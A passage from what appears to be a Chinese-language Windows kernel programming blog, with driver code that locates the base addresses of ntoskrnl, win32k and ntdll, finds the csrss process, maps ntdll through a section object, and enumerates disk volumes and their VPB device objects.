class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">FreeMemory1</span>(VirtualAddress);</span><br><span class="line">            <span class="keyword">return</span> Status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (Status == STATUS_INFO_LENGTH_MISMATCH);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//游历内存</span></span><br><span class="line">    RtlProcessModules = (PRTL_PROCESS_MODULES)VirtualAddress;</span><br><span class="line">    NumberOfModules = (RtlProcessModules-&gt;NumberOfModules);</span><br><span class="line"></span><br><span class="line">    RtlProcessModuleInfo = (PRTL_PROCESS_MODULE_INFORMATION)(RtlProcessModules-&gt;Modules);  <span class="comment">//获取到第一个模块信息</span></span><br><span class="line"></span><br><span class="line">    v1 = <span class="built_in">strrchr</span>(RtlProcessModuleInfo-&gt;FullPathName, <span class="string">&#x27;\\&#x27;</span>);  <span class="comment">//右边第一次出现的字符</span></span><br><span class="line">    <span class="keyword">if</span> (v1)</span><br><span class="line">    &#123;</span><br><span class="line">        v1++;</span><br><span class="line">        <span class="built_in">RtlInitAnsiString</span>(&amp;v2, v1);  <span class="comment">//char数组转换成Ansi</span></span><br><span class="line">        Status = <span class="built_in">RtlAnsiStringToUnicodeString</span>(&amp;v3, &amp;v2, TRUE);   <span class="comment">//Ansi转换成Unicode</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">RtlStringCchCatW</span>(__NtosFilePath, <span class="built_in">sizeof</span>(__NtosFilePath) / <span class="built_in">sizeof</span>(WCHAR), <span class="string">L&quot;\\SystemRoot\\system32\\&quot;</span>);</span><br><span class="line">            <span class="built_in">RtlStringCchCatNW</span>(__NtosFilePath, <span class="built_in">sizeof</span>(__NtosFilePath) / <span class="built_in">sizeof</span>(WCHAR), v3.Buffer, v3.Length / <span class="built_in">sizeof</span>(WCHAR));</span><br><span class="line">            <span class="built_in">RtlFreeUnicodeString</span>(&amp;v3);   <span class="comment">//TRUE</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//v3 struct _UNICODE_STRING &quot;ntkrnlpa.exe&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ntoskrnl.exe    Ntdll.dll    Ssdt</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取系统第一个模块信息 ntoskrnl.exe</span></span><br><span class="line">    __NtosImageBase = RtlProcessModuleInfo[<span class="number">0</span>].ImageBase;</span><br><span class="line">    __NtosImageSize = RtlProcessModuleInfo[<span class="number">0</span>].ImageSize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 枚举系统模块信息</span></span><br><span class="line">    <span class="comment">//win32k.sys / WIN32KFULL.SYS     User32.dll   Sssdt</span></span><br><span class="line">    <span class="keyword">for</span> (i = (LONG)NumberOfModules - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//c:\windows\system\win32k.sys</span></span><br><span class="line">        ModuleName = (RtlProcessModuleInfo[i].FullPathName + RtlProcessModuleInfo[i].OffsetToFileName);</span><br><span class="line">        <span class="keyword">if</span> (!_stricmp(ModuleName, WIN32K_SYS))</span><br><span class="line">        &#123;</span><br><span class="line">            __Win32kImageBase = RtlProcessModuleInfo[i].ImageBase;  <span class="comment">//0x87e5a31d &quot;win32k.sys&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (__OsVersion == WIN10_VERSION_10240)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!_stricmp(ModuleName, <span class="string">&quot;win32kfull.sys&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                __Win32kFullImageBase = RtlProcessModuleInfo[i].ImageBase;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//ntdll.dll  </span></span><br><span class="line">    <span class="keyword">for</span> (i = (LONG)NumberOfModules - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//判断地址是否在Ring3层的范围内</span></span><br><span class="line">        <span class="comment">//0: kd&gt; dd MmSystemRangeStart</span></span><br><span class="line">        <span class="comment">//849a584c  80000000 7fff0000 80741000 000fffff</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((ULONG_PTR)RtlProcessModuleInfo[i].ImageBase &gt; (ULONG_PTR)MmSystemRangeStart)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ModuleName = (RtlProcessModuleInfo[i].FullPathName + RtlProcessModuleInfo[i].OffsetToFileName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!_stricmp(ModuleName, NTDLL_DLL))</span><br><span class="line">        &#123;</span><br><span class="line">            __NtdllImageBase = RtlProcessModuleInfo[i].ImageBase;</span><br><span class="line">            __NtdllImageSize = RtlProcessModuleInfo[i].ImageSize;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> == __NtdllImageBase)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        __NtdllImageBase = <span class="built_in">MappingModuleInfo</span>(<span class="string">L&quot;\\SystemRoot\\System32\\ntdll.dll&quot;</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">///&lt; ntdll</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!__NtosImageBase || !__Win32kImageBase || !__NtdllImageBase)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">FreeMemory1</span>(VirtualAddress);</span><br><span class="line">        <span class="keyword">return</span> STATUS_NOT_FOUND;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取Csrss进程的方法</span></span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">NULL</span> == VirtualAddress)</span><br><span class="line">        &#123;</span><br><span class="line">            VirtualAddress = <span class="built_in">AllocateMemory1</span>(ViewSize);</span><br><span class="line">            <span class="keyword">if</span> (VirtualAddress == <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> STATUS_NO_MEMORY;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        Status = <span class="built_in">ZwQuerySystemInformation</span>(SystemProcessInformation, VirtualAddress, ViewSize, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span> (Status == STATUS_INFO_LENGTH_MISMATCH)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">FreeMemory1</span>(VirtualAddress);</span><br><span class="line">            VirtualAddress = <span class="literal">NULL</span>;</span><br><span class="line">            ViewSize *= <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">FreeMemory1</span>(VirtualAddress);</span><br><span class="line">            <span class="keyword">return</span> Status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (Status == STATUS_INFO_LENGTH_MISMATCH);</span><br><span class="line"></span><br><span class="line">    Status = STATUS_NOT_FOUND;</span><br><span class="line"></span><br><span class="line">    SystemProcessInfo = (PSYSTEM_PROCESS_INFORMATION)VirtualAddress;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (TRUE)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (SystemProcessInfo-&gt;ImageName.Length == <span class="built_in">sizeof</span>(CSRSS_IMAGE_NAME) - <span class="built_in">sizeof</span>(WCHAR))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (!_wcsnicmp(SystemProcessInfo-&gt;ImageName.Buffer,</span><br><span class="line">                CSRSS_IMAGE_NAME,</span><br><span class="line">                (<span class="built_in">sizeof</span>(CSRSS_IMAGE_NAME) - <span class="built_in">sizeof</span>(WCHAR)) / <span class="built_in">sizeof</span>(WCHAR)))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//插入到数据结构中</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">InsertCsrssProcessIdentity</span>(SystemProcessInfo-&gt;UniqueProcessId, SystemProcessInfo-&gt;SessionId))</span><br><span class="line">                &#123;</span><br><span class="line">                    Status = STATUS_SUCCESS;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (SystemProcessInfo-&gt;NextEntryOffset == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">break</span>;  <span class="comment">//下一个信息如果不存在</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        (ULONG_PTR)SystemProcessInfo += SystemProcessInfo-&gt;NextEntryOffset;   <span class="comment">//定位到下一条信息上</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FreeMemory1</span>(VirtualAddress);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="使用内存映射方法获取ntdll模块信息"><a href="#使用内存映射方法获取ntdll模块信息" class="headerlink" title="使用内存映射方法获取ntdll模块信息"></a>使用内存映射方法获取ntdll模块信息</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">MappingModuleInfo</span><span class="params">(LPCWSTR FilePath, PULONG ImageFileSize, PULONG ImageSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SEC_IMAGE                   0x1000000    <span class="comment">//内存粒度对齐  </span></span></span><br><span class="line"></span><br><span class="line">    PVOID ImageBase = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE FileHandle = <span class="literal">NULL</span>;</span><br><span class="line">    HANDLE SectionHandle = <span class="literal">NULL</span>;</span><br><span class="line">    UNICODE_STRING FilePathU;</span><br><span class="line">    IO_STATUS_BLOCK IoStatusBlock = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    SIZE_T ViewSize = <span class="number">0</span>;</span><br><span class="line">    OBJECT_ATTRIBUTES ObjectAttributes = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="comment">//LARGE_INTEGER SectionOffset;</span></span><br><span class="line">    SECTION_IMAGE_INFORMATION SectionImageInfo;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;FilePathU, FilePath);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//内核句柄    </span></span><br><span class="line">    <span class="built_in">InitializeObjectAttributes</span>(&amp;ObjectAttributes, &amp;FilePathU, OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过文件路径获取文件句柄</span></span><br><span class="line">    Status = <span class="built_in">ZwOpenFile</span>(&amp;FileHandle,</span><br><span class="line">        SYNCHRONIZE | GENERIC_READ | FILE_EXECUTE,</span><br><span class="line">        &amp;ObjectAttributes,</span><br><span class="line">        &amp;IoStatusBlock,</span><br><span class="line">        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,</span><br><span class="line">        FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ObjectAttributes.ObjectName = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过文件句柄获取内存映射句柄</span></span><br><span class="line">    Status = <span class="built_in">ZwCreateSection</span>(&amp;SectionHandle,</span><br><span class="line">        SECTION_MAP_READ | SECTION_QUERY | SECTION_MAP_EXECUTE,</span><br><span class="line">        &amp;ObjectAttributes,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        PAGE_READONLY,</span><br><span class="line">        SEC_IMAGE,</span><br><span class="line">        FileHandle);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取内存对象中的数据</span></span><br><span class="line">    Status = <span class="built_in">ZwQuerySection</span>(SectionHandle,</span><br><span class="line">        SectionImageInformation,</span><br><span class="line">        &amp;SectionImageInfo,</span><br><span class="line">        <span class="built_in">sizeof</span>(SectionImageInfo),</span><br><span class="line">        <span class="literal">NULL</span></span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ImageFileSize) &#123;</span><br><span class="line">        *ImageFileSize = SectionImageInfo.ImageFileSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过Section句柄获取虚拟地址</span></span><br><span class="line">    Status = <span class="built_in">ZwMapViewOfSection</span>(</span><br><span class="line">        SectionHandle,</span><br><span class="line">        <span class="built_in">NtCurrentProcess</span>(),</span><br><span class="line">        &amp;ImageBase,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        &amp;ViewSize,</span><br><span class="line">        ViewShare,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        PAGE_READONLY);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status)) &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ImageSize) &#123;</span><br><span class="line">        *ImageSize = ViewSize;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">Exit:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != FileHandle) &#123;</span><br><span class="line">        <span class="built_in">ZwClose</span>(FileHandle);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="literal">NULL</span> != SectionHandle) &#123;</span><br><span class="line">        <span class="built_in">ZwClose</span>(SectionHandle);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ImageBase;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Windows Kernel </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>获取卷信息</title>
      <link href="/2024/03/09/%E8%8E%B7%E5%8F%96%E5%8D%B7%E4%BF%A1%E6%81%AF/"/>
      <url>/2024/03/09/%E8%8E%B7%E5%8F%96%E5%8D%B7%E4%BF%A1%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="获取卷信息"><a href="#获取卷信息" class="headerlink" title="获取卷信息"></a>获取卷信息</h1><p>使用内核链表和快速互斥体。</p><p>快速互斥体不支持递归获取，也就是不允许自己线程重复获取。</p><p>一般互斥体只其他线程，自己线程可以多次取得。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">FAST_MUTEX __VolumeInfoLock;</span><br><span class="line">LIST_ENTRY __VolumeInfoList;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitializeVolumeInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">ExInitializeFastMutex</span>(&amp;__VolumeInfoLock);</span><br><span class="line">    <span class="built_in">InitializeListHead</span>(&amp;__VolumeInfoList);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">EnumVolumeInfo</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="枚举卷信息"><a href="#枚举卷信息" class="headerlink" title="枚举卷信息"></a>枚举卷信息</h2><p>从A盘开始，将路径转为UnicodeString，再转到OA，调用ZwCreateFile获取卷句柄，调用ZwQueryObject获取对象信息，插入数据结构中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">EnumVolumeInfo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    WCHAR DosDevice[] = <span class="string">L&quot;\\DosDevices\\X:&quot;</span>;</span><br><span class="line">    UNICODE_STRING v1;</span><br><span class="line">    WCHAR i;</span><br><span class="line">    OBJECT_ATTRIBUTES ObjectAttributes;</span><br><span class="line">    HANDLE VolumeHandle;</span><br><span class="line">    NTSTATUS Status;</span><br><span class="line">    IO_STATUS_BLOCK IoStatusBlock;</span><br><span class="line"></span><br><span class="line">    OBJECT_NAME_INFORMATION* ObjectNameInfo = <span class="literal">NULL</span>;</span><br><span class="line">    ULONG ObjectNameInfoLength = BUFFER_SIZE_MAX;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FreeVolumeInfo</span>();</span><br><span class="line"></span><br><span class="line">    ObjectNameInfo = (OBJECT_NAME_INFORMATION*)<span class="built_in">AllocateBufferFromLookAsideList</span>();  <span class="comment">// 动态申请内存</span></span><br><span class="line">    <span class="keyword">if</span> (ObjectNameInfo == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 从A盘开始遍历</span></span><br><span class="line">        DosDevice[<span class="number">12</span>] = <span class="string">L&#x27;A&#x27;</span> + i;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">RtlInitUnicodeString</span>(&amp;v1, DosDevice);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">InitializeObjectAttributes</span>(&amp;ObjectAttributes,</span><br><span class="line">            &amp;v1, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        Status = <span class="built_in">ZwCreateFile</span>(</span><br><span class="line">            &amp;VolumeHandle,</span><br><span class="line">            SYNCHRONIZE | FILE_ANY_ACCESS,</span><br><span class="line">            &amp;ObjectAttributes,</span><br><span class="line">            &amp;IoStatusBlock,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">            FILE_OPEN,</span><br><span class="line">            FILE_SYNCHRONOUS_IO_NONALERT | FILE_DIRECTORY_FILE,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status) == FALSE)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        ObjectNameInfoLength = BUFFER_SIZE_MAX;</span><br><span class="line">        Status = <span class="built_in">ZwQueryObject</span>(VolumeHandle, <span class="number">1</span>, ObjectNameInfo, ObjectNameInfoLength,</span><br><span class="line">            &amp;ObjectNameInfoLength);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">NT_SUCCESS</span>(Status) == TRUE)</span><br><span class="line">            <span class="built_in">AddVolumeInfo</span>(VolumeHandle, <span class="string">L&#x27;A&#x27;</span> + i, &amp;ObjectNameInfo-&gt;Name);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">ZwClose</span>(VolumeHandle);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ObjectNameInfo != <span class="literal">NULL</span>)</span><br><span class="line">        <span class="built_in">FreeBufferToLookAsideList</span>(ObjectNameInfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="解析卷信息"><a href="#解析卷信息" class="headerlink" title="解析卷信息"></a>解析卷信息</h2><p>ObReferenceObjectByHandle从句柄到对象，FileObject-&gt;DeviceObject-&gt;Vpb由文件对象获取Vpb，Vpb-&gt;DeviceObject获取Vpb对象，判断是否存在。</p><p>动态申请VOLUME_INFO结构，将各种信息放入，插入链表中。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AddVolumeInfo</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    HANDLE VolumeHandle,</span></span></span><br><span class="line"><span class="params"><span class="function">    WCHAR  VolumeName,</span></span></span><br><span class="line"><span class="params"><span class="function">    UNICODE_STRING* DeviceName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    VOLUME_INFO* v5 = <span class="literal">NULL</span>;</span><br><span class="line">    FILE_OBJECT* FileObject = <span class="literal">NULL</span>;</span><br><span class="line">    PVPB           Vpb = <span class="literal">NULL</span>;</span><br><span class="line">    DEVICE_OBJECT* VpbDeviceObject = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    ULONG v7 = <span class="built_in">sizeof</span>(VOLUME_INFO) + (DeviceName-&gt;Length + <span class="number">1</span>) * <span class="built_in">sizeof</span>(WCHAR);</span><br><span class="line"></span><br><span class="line">    NTSTATUS Status = <span class="built_in">ObReferenceObjectByHandle</span>(VolumeHandle, </span><br><span class="line">        <span class="number">0</span>, <span class="number">0</span>, KernelMode, (PVOID*)&amp;FileObject, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span>(Status))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!FileObject || !FileObject-&gt;DeviceObject || !FileObject-&gt;DeviceObject-&gt;Vpb)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Vpb = FileObject-&gt;DeviceObject-&gt;Vpb;   <span class="comment">//卷参数块 (VPB) 结构用于将表示已装载的文件系统卷的设备对象映射到表示物理或虚拟磁盘设备的设备对象 https://learn.microsoft.com/zh-cn/windows-hardware/drivers/ddi/wdm/ns-wdm-_vpb</span></span><br><span class="line">    VpbDeviceObject = Vpb-&gt;DeviceObject;</span><br><span class="line">    <span class="keyword">if</span> (!VpbDeviceObject)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    v5 = (VOLUME_INFO*)<span class="built_in">AllocateBuffer</span>(v7);</span><br><span class="line">    <span class="keyword">if</span> (v5 == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">goto</span> Exit;</span><br><span class="line">    &#125;</span><br><span class="line">    v5-&gt;DeviceObject = FileObject-&gt;DeviceObject;</span><br><span class="line">    v5-&gt;VpbDeviceObject = VpbDeviceObject;</span><br><span class="line">    v5-&gt;VolumeName = VolumeName;</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;v5-&gt;DeviceName[<span class="number">0</span>], DeviceName-&gt;Buffer, DeviceName-&gt;Length);</span><br><span class="line">    v5-&gt;Length = DeviceName-&gt;Length / <span class="built_in">sizeof</span>(WCHAR);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExAcquireFastMutex</span>(&amp;__VolumeInfoLock);</span><br><span class="line">    <span class="built_in">InsertTailList</span>(&amp;__VolumeInfoList, &amp;v5-&gt;ListEntry);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">ExReleaseFastMutex</span>(&amp;__VolumeInfoLock);</span><br><span class="line">Exit:</span><br><span class="line">    <span class="built_in">ObDereferenceObject</span>(FileObject);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span 